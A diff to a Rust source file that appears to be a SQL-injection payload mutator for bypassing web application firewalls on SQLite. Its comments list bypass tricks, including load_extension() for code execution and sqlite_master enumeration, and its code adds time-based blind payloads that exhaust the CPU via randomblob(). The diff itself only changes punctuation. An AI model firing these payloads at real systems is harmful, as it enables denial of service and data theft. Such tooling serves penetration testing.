@@ -2,7 +2,7 @@
 //!
 //! SQLite has unique WAF bypass features:
 //! - `GLOB` / `MATCH` operators (alternatives to `=` and `LIKE`)
-//! - No built-in `SLEEP()` — CPU exhaustion via `randomblob()` or heavy `LIKE`
+//! - No built-in `SLEEP()`: CPU exhaustion via `randomblob()` or heavy `LIKE`
 //! - `||` concatenation as standard
 //! - `load_extension()` for RCE
 //! - `sqlite_master` table for schema enumeration
@@ -22,7 +22,7 @@ pub fn mutate(payload: &str, max_mutations: usize) -> Vec<String> {
     }
 
     // ── CPU exhaustion (time-based blind) ──
-    // SQLite has no SLEEP — use computation-heavy operations
+    // SQLite has no SLEEP, use computation-heavy operations
     results.push("SELECT hex(randomblob(500000000))".into());
     results.push("SELECT randomblob(1000000000)".into());
     results.push("SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))".into());
